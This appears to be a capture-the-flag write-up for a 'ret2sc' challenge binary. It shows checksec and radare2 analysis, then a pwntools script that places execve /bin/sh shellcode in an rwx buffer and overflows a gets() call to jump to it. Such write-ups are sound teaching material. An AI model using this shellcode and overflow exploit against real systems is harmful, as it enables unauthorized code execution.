1. `file ret2sc` to take a look.
```bash
$ file ret2sc
ret2sc: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), 
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, 
BuildID[sha1]=b83f13f0a84fdae7a5bc54d828d0e4ea15575d6d, not stripped
```

2. gdb checksec to check the protection of this program.
```bash
$ gdb-peda ret2sc
Reading symbols from ret2sc...
(No debugging symbols found in ret2sc)
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
gdb-peda$
```

3. `r2 ret2sc`, there's nothing special.
```bash
$ r2 ret2sc
[0x00400540]> aa
[x] Analyze all flags starting with sym. and entry0 (aa)
[0x00400540]> afl
0x00400540    1 41           entry0
0x00400500    1 6            sym.imp.__libc_start_main
0x00400570    4 50   -> 41   sym.deregister_tm_clones
0x004005b0    4 58   -> 55   sym.register_tm_clones
0x004005f0    3 28           sym.__do_global_dtors_aux
0x00400610    4 38   -> 35   entry.init0
0x00400720    1 2            sym.__libc_csu_fini
0x00400724    1 9            sym._fini
0x004006b0    4 101          sym.__libc_csu_init
0x00400636    1 114          main
0x00400520    1 6            sym.imp.setvbuf
0x004004e0    1 6            sym.imp.printf
0x004004f0    1 6            sym.imp.read
0x00400510    1 6            sym.imp.gets
0x004004b0    3 26           sym._init
0x00400530    1 6            sym..plt.got
[0x00400540]>
```

4. `s main`, `VV`. We saw there are two input, one is "name", another is "try your best:". the first will be put at **0x601080**, second will be put at **var_20h(rbp-0x20)**.
![Image](https://i.imgur.com/kkBkEOG.png)

5. by the result above, we need to find the place that we can inject our shellcode, use gdb-peda.
`gde-peda ret2sc`, `b main`, `r`

```bash
$ gdb-peda ret2sc
Reading symbols from ret2sc...
(No debugging symbols found in ret2sc)
gdb-peda$ b main
Breakpoint 1 at 0x40063a
gdb-peda$ r
```

then `vmmap`, we found that address between 0x601000-0x602000 have permission of rwx, and our input "name" (0x601080) is in this range. so we can inject our shellcode here.

![Image](https://i.imgur.com/WQSd5Zm.png)


6. write the exploit script, shellcode can be found on the [exploit-db](https://www.exploit-db.com/shellcodes) website.

```python
from pwn import *

context.arch = "amd64"

ip = "120.114.62.211"
port = 2122

# r = remote(ip,port)
r = process("./ret2sc")

shellcode =\
"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

r.sendafter(":", shellcode)
# r.recvuntil(':')
# r.sendline(shellcode)

shellcode_address = 0x601080
r.recvuntil(':')
r.sendline(b"A"*0x28 + p64(shellcode_address))

r.interactive()
```

7. run the code and then we can get the shell, find the flag and print it.